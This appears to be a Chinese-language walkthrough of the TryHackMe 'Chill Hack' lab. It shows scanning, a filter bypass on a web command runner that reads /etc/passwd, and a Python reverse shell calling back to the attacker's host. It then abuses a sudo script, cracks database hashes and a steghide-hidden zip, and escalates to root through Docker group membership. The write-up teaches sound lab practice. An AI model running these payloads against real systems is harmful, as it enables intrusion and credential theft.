# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/tryhackme/chillhack]
└─# nmap -sV -Pn 10.10.49.122
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:47 EDT
Nmap scan report for 10.10.49.122
Host is up (0.33s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds
```

开启的服务有ftp,ssh,http

# 匿名登录ftp
有一个note.txt文件，下载到本地分析
```
└─# ftp 10.10.49.122
Connected to 10.10.49.122.
220 (vsFTPd 3.0.3)
Name (10.10.49.122:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -alh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (37.4800 kB/s)
ftp> bye
221 Goodbye.

```

查看该文件
```
┌──(root💀kali)-[~/tryhackme/chillhack]
└─# cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar

```

暴露两个可能的用户名：```Anurodh```和```Apaar```

命令行加了一些过滤？

# 查看80端口服务
爆破目录
```
└─# python3 dirsearch.py -u "http://10.10.49.122" -e* -t 100             2 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )
                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak                                                                    
HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.49.122/_21-10-27_09-49-03.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-27_09-49-03.log

Target: http://10.10.49.122/

[09:49:04] Starting:                                        
[09:49:30] 200 -   21KB - /about.html                                       
[09:49:51] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[09:49:54] 200 -    0B  - /contact.php                                      
[09:49:54] 200 -   18KB - /contact.html                                     
[09:49:55] 301 -  310B  - /css  ->  http://10.10.49.122/css/                
[09:50:02] 301 -  312B  - /fonts  ->  http://10.10.49.122/fonts/            
[09:50:07] 301 -  313B  - /images  ->  http://10.10.49.122/images/          
[09:50:07] 200 -   16KB - /images/                                          
[09:50:09] 200 -   34KB - /index.html                                       
[09:50:10] 200 -    3KB - /js/                                              
[09:50:22] 200 -   19KB - /news.html                                        
[09:50:35] 301 -  313B  - /secret  ->  http://10.10.49.122/secret/          
[09:50:35] 403 -  277B  - /server-status                                    
[09:50:36] 403 -  277B  - /server-status/                                   
[09:50:36] 200 -  168B  - /secret/                                          

Task Completed     
```

我们看到有一个叫```/secret/```的目录，一般能叫这种名字的多数都是攻击点

打开发现是一个命令行执行程序

经过测试，命令行做了一些过滤，很多命令都不能正常执行，但是我们可以用```$@```绕过

比如查看```/etc/passwd```
```
c$@at /etc/passwd


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

我们创建一个反弹shell，使用paylpad:
```python3$@ -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.21.169",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'```


# 拿到初始shell
```
┌──(root💀kali)-[~/tryhackme/chillhack]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.49.122] 58604
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
whoami
www-data
```

切换成tty,查看本账户权限，可以用apaar的身份运行一个脚本
```
www-data@ubuntu:/var/www/html/secret$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

查看这个脚本的内容和权限
```
cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
www-data@ubuntu:/var/www/html/secret$ ls -alh /home/apaar/.helpline.sh
ls -alh /home/apaar/.helpline.sh
-rwxrwxr-x 1 apaar apaar 286 Oct  4  2020 /home/apaar/.helpline.sh
```

此文件对于本账户不可写，因此不可以直接把shell写进bash
但是留意代码内容，它分别接受两个参数，第一个```person```没有什么作用，第二个```msg```，我们可以看见是作为一个命令直接执行了，因此我们可以加以利用


# 横向提权到apaar
我们把msg命令赋值为：```/bin/bash```，拿到apaar的shell
```
www-data@ubuntu:/var/www/html/secret$ sudo -u apaar  /home/apaar/.helpline.sh 
<ml/secret$ sudo -u apaar  /home/apaar/.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: max
max
Hello user! I am max,  Please enter your message: /bin/bash
/bin/bash
id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
whoami
whoami
apaar
```

在apaar的home目录拿到user flag

# 横向提权到Anurodh

我们在```/var/www/files/index.php```找到数据库登录信息
```
apaar@ubuntu:/var/www/files$ cat index.php
cat index.php
<html>
<body>
<?php
        if(isset($_POST['submit']))
        {
                $username = $_POST['username'];
                $password = $_POST['password'];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit("Connection failed ". $e->getMessage());
                }
                require_once("account.php");
                $account = new Account($con);
                $success = $account->login($username,$password);
                if($success)
                {
                        header("Location: hacker.php");
                }
        }
?>
```

登录数据库，在user表找到两个用户密码
```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use webportal
use webportal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
```

两个md5解密出来分别是：
>Anurodh ：masterpassword
>Apaar ：dontaskdonttell


然而这两个并不是ssh密码。。。


我们把images里面的两个文件下载到本地，用steghide分离出一个隐藏文件
```
└─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg                                                                                                                                                                          127 ⨯
Enter passphrase: 
wrote extracted data to "backup.zip".
```

用zip2john把文件转成john可以读取的信息，然后再用john破解这个zip文件
```
┌──(root💀kali)-[~/tryhackme/chillhack]
└─# zip2john backup.zip >passwd.hash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3

┌──(root💀kali)-[~/tryhackme/chillhack]
└─# john passwd.hash passwd.hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                                                             1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)
1g 0:00:00:00 DONE (2021-10-27 13:06) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s total90..cocoliso
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


解压加密zip得到一个php文件
```
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
```

从代码可知，这是验证anurodh的登录文件，密码被base64加密

这个凭证可以登录anurodh的ssh

登录进去以后传linpeas，发现当前用户在docker用户组，可以利用组权限提权
```
anurodh@ubuntu:/tmp$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

# 提权到root
```
anurodh@ubuntu:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd /root
# ls
proof.txt
```


